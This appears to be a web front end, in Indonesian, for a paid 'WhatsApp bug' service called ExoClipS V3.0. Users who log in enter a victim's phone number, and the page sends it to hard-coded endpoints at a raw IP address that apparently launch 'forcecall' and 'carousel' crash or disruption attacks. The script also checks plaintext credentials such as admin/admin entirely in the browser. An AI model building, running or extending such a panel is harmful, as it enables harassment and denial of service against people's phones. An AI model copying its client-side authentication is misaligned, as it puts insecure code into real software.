<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>𝗲𝗫𝗼𝗖𝗹𝗶𝗽𝗦</title>

  <script src="https://cdn.tailwindcss.com"></script>

  <style>
    body {
      background: url('https://img1.pixhost.to/images/6818/616113899_skyzopedia.jpg') no-repeat center/cover fixed;
    }
    .glow::before {
      content:'';
      position:absolute; inset:0; margin:auto;
      width:260px; height:260px;
      background:radial-gradient(circle at center,#6366f1 0%,transparent 70%);
      filter:blur(60px); opacity:.55; z-index:-1;
    }
    .lamp {
      position:absolute; top:-14px; left:50%; translate:-50% 0;
      width:18px; height:18px; border-radius:9999px;
      background:#3b82f6; box-shadow:0 0 18px 8px #3b82f6aa;
    }
    input,button,label { transition:all .3s ease-in-out }
    input:focus {
      transform:scale(1.02);
      outline:none;
      box-shadow:0 0 0 3px rgb(99 102 241 / .5);
    }
    button:hover { transform:scale(1.02) }
    button:active { transform:scale(.98) }
    #status { transition:color .3s,opacity .3s; min-height:1.25rem }
    #credit {
      font-size:.8rem; color:#3b82f6;
      text-align:center; margin-bottom:.4rem; font-weight:500;
      user-select:none;
    }
    #logoutBtn {
      background:#ef4444; color:#fff;
      padding:.4rem .8rem; border-radius:.375rem;
      font-weight:600; font-size:.875rem;
      border:none; cursor:pointer;
    }
    #logoutBtn:hover { background:#dc2626 }
       
    #supportBtn {
      background:#000000; color:#fff;
      padding:.4rem .8rem; border-radius:.375rem;
      font-weight:600; font-size:.875rem;
      border:none; cursor:pointer;
    }
    #supportBtn:hover { background:#000000 }

    /* Overlay styles */
    #overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.5);
      display: none; /* Hidden by default */
      justify-content: center;
      align-items: center;
      z-index: 1000; /* Above other content */
    }
  </style>
</head>
<body class="min-h-screen flex items-center justify-center text-gray-800 dark:text-white">

  <div id="overlay">
    <div class="text-white">Loading...</div>
  </div>

  <div class="relative glow">
    <div id="card" class="w-[22rem] sm:w-[26rem] p-8 bg-white/90 dark:bg-gray-800/80 backdrop-blur rounded-lg shadow-2xl">

      <div id="loginView">
       <div class="text-center w-full px-4 py-2 rounded-md border border-blue-500 bg-gray-100 text-gray-800"> 𝗲𝗫𝗼𝗖𝗹𝗶𝗽𝗦 𝗩𝟯.𝟬</div>
            
         <div class="flex justify-center items-center py-10 bg-transparent">
         <img src="https://img1.pixhost.to/images/6818/616118454_depayyy.jpg" alt="maklo" class="w-40 h-40 object-cover rounded-full border-4 border-red-500 shadow-lg" />
         </div>
         
        <input id="username" type="text" placeholder="Username Account"
          class="w-full mb-3 px-4 py-2 rounded-md border bg-gray-100 border-gray-300" />
        <input id="password" type="password" placeholder="Password Account"
          class="w-full mb-3 px-4 py-2 rounded-md border bg-gray-100 border-gray-300" />
        <div class="space-y-[2px]"> <button id="loginBtn" class="w-full py-2 bg-indigo-600 hover:bg-indigo-700 text-white rounded-md"> 𝗟𝗼𝗴𝗶𝗻 </button>
       <a href="https://wa.me/6282262961033" class="w-full block text-center py-2 bg-green-600 hover:bg-green-700 text-white rounded-md"> 𝗕𝘂𝘆 𝗨𝘀𝗲𝗿? 𝗣𝗺 𝗠𝗲</a>
        </div>
     </div>
      
      <div id="mainView" class="hidden">
        <div class="flex justify-between items-center mb-6">
         
          <span id="welcomeUser " class="text-lg font-semibold text-indigo-600"></span>
          <button id="logoutBtn">𝗟𝗼𝗴 𝗢𝘂𝘁</button>
        </div>
        
        <form id="bugForm" class="space-y-4" onsubmit="return false;">
            
        <div class="text-center w-full px-4 py-2 rounded-md border border-red-500 bg-gray-100 text-gray-800"> 𝗘𝘅𝗼𝗖𝗹𝗶𝗽𝘀 𝗩𝗲𝗿𝘀𝗶𝗼𝗻 𝟯.𝟬 </div>
            
         <div class="flex justify-center items-center py-10 bg-transparent">
         <img src="https://img1.pixhost.to/images/6818/616118454_depayyy.jpg" alt="maklo" class="w-40 h-40 object-cover rounded-full border-4 border-red-500 shadow-lg" />
         </div>
            
        <form id="bugForm" class="space-y-4" onsubmit="return false;">
          <input id="phone" type="text" placeholder="𝗠𝗮𝘀𝘂𝗸𝗮𝗻 𝗡𝗼𝗺𝗲𝗿 𝗧𝗮𝗿𝗴𝗲𝘁"
            class="w-full px-4 py-2 rounded-md border bg-gray-100 border-gray-300"/>

          <button id="sendBtn"
            class="w-full py-3 bg-red-600 hover:bg-red-700 text-white rounded-md">
            𝗙𝗢𝗥𝗖𝗘 𝗖𝗟𝗢𝗦𝗘
          </button>

          <div class="flex justify-between gap-3">
            <button type="button" id="btnAndroid"
              class="w-full py-2 bg-green-500 hover:bg-green-600 text-white rounded-md">
              𝗖𝗔𝗥𝗢𝗨𝗦𝗘𝗟
            </button>
            <button type="button" id="btnIOS"
              class="w-full py-2 bg-blue-500 hover:bg-blue-600 text-white rounded-md">
              𝗗𝗘𝗟𝗔𝗬
            </button>
          </div>

          <p id="status" class="text-center text-sm h-5"></p>
        </form>
      </div>
        <div id="credit">© Buy User Untuk Pribadi? Chat OwnerKu</div>
     <a a href="https://wa.me/6282262961033" id="supportBtn">Support</a>
    </div>
  </div>

  <script>
    const usersDB = [
      { user: "rey", password: "12345" },
      { user: "primrose", password: "qwerty" },
      { user: "admin", password: "admin" }
    ];

    const loginView = document.getElementById('loginView');
    const mainView = document.getElementById('mainView');
    const usernameInput = document.getElementById('username');
    const passwordInput = document.getElementById('password');
    const loginBtn = document.getElementById('loginBtn');
    const logoutBtn = document.getElementById('logoutBtn');
    const welcomeUser  = document.getElementById('welcomeUser ');
    const overlay = document.getElementById('overlay');

    const phoneInput = document.getElementById('phone');
    const statusEl = document.getElementById('status');

    if (matchMedia('(prefers-color-scheme: dark)').matches)
      document.body.classList.add('dark');

    function checkCredentials(user, pass) {
      return usersDB.find(u => u.user === user && u.password === pass);
    }

    loginBtn.onclick = () => {
      const u = usernameInput.value.trim();
      const p = passwordInput.value.trim();
      if (!u || !p) {
        alert('Isi semua kolom');
        return;
      }
      const ok = checkCredentials(u, p);
      if (!ok) {
        alert('Username atau password salah');
        return;
      }
      localStorage.setItem('username', u);
      showMain(u);
    };

    function showMain(user) {
      welcomeUser .textContent = `Welcome, ${user}`;
      loginView.classList.add('hidden');
      mainView.classList.remove('hidden');
      overlay.style.display = 'flex'; // Show overlay
      setTimeout(() => {
        overlay.style.display = 'none'; // Hide overlay after a short delay
      }, 2000); // Adjust the delay as needed
    }

    logoutBtn.onclick = () => {
      localStorage.removeItem('username');
      location.reload();
    };

    window.onload = () => {
      const saved = localStorage.getItem('username');
      if (saved) showMain(saved);
    };

    async function sendForcecall() {
      const phone = phoneInput.value.trim();
      if (!phone) {
        statusEl.textContent = '❌ Nomor belum diisi';
        return;
      }
      statusEl.textContent = '⏳ Mengirim Forcecall...';
      try {
        const res = await fetch(`http://143.198.177.1:4007/api/bug/fc?target=${phone}`);
        const data = await res.json();
        statusEl.textContent = data.status ? '✅ Forcecall berhasil!' : `⚠️ Gagal: ${data.message || data.error || 'Unknown'}`;
      } catch (err) {
        console.error(err);
        statusEl.textContent = '🚫 Gagal terhubung ke API';
      }
    }

    async function sendCarousels() {
      const phone = phoneInput.value.trim();
      if (!phone) {
        statusEl.textContent = '❌ Nomor belum diisi';
        return;
      }
      statusEl.textContent = '⏳ Mengirim Carousels...';
      try {
        const res = await fetch(`http://143.198.177.1:4007/api/bug/carousel?target=${phone}`);
        const data = await res.json();
        statusEl.textContent = data.status ? '✅ Carousels berhasil!' : `⚠️ Gagal: ${data.message || data.error || 'Unknown'}`;
      } catch (err) {
        console.error(err);
        statusEl.textContent = '🚫 Gagal terhubung ke API';
      }
    }

    document.getElementById('sendBtn').onclick = () => {
      statusEl.textContent = '⏳ Delay Only (placeholder)...';
    };
    document.getElementById('btnAndroid').onclick = sendForcecall;
    document.getElementById('btnIOS').onclick = sendCarousels;
  </script>
</body>
</html>
